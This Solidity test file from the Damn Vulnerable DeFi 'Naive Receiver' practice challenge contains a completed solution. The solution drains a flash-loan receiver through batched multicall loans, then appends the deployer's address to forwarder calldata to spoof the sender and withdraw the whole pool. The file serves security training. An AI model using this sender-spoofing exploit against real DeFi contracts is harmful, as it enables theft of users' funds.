// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {console} from "forge-std/console.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Stage 1: Get all tokens from receiver back to pool
        // for(uint256 i =0; i<10; i++) {
        //     pool.flashLoan(
        //         receiver,
        //         address(weth),
        //         100e18,
        //         bytes("")
        //     );
        // }
        bytes[] memory flashloanData = new bytes[](10);
        for (uint256 i=0; i<10; i++) {
            flashloanData[i] = abi.encodeCall(
                pool.flashLoan,
                (receiver, address(weth), 100e18, "")
            );
        }
        pool.multicall(flashloanData);

        // After stage 1, deposits[deployer] == 1010 WETH (1000 from the start + 10 loan fees)
        
        // Stage 2: :Get all tokens from pool to recovery using withdraw(), trigger deposist[deployer] -= 1010 and wei.transfer(recovery, 1010)
        // forwarder.execute(pool.multicall(pool.withdraw())) + alter last 20 bytes to change the _msgSender() to recovery 
        // => pool.withdraw() using msgSender as deployer
        // The reason we use pool.multicall() here is because it will delegate call to NaiveReceiverPool
        
        // Crafting multicall's data to execute withdraw()
        bytes[] memory multicallData = new bytes[](1);
        multicallData[0] = abi.encodePacked(
            abi.encodeCall(
                pool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
            ),
            deployer
        );

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: 0,
            data: abi.encodeCall(pool.multicall, multicallData),
            deadline: uint256(block.timestamp) + 30 days
        });

        // Crafting transfer call to invoke forwarder.execute()
        bytes32 msgHash = forwarder.getDataHash(request);
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                msgHash
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);
        // address signer = ECDSA.recover(digest, signature);

        forwarder.execute(
            request,
            signature
        );
    }
    

    // Open question: can we use forwarder.execue(pool.withdraw()) instead?
    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
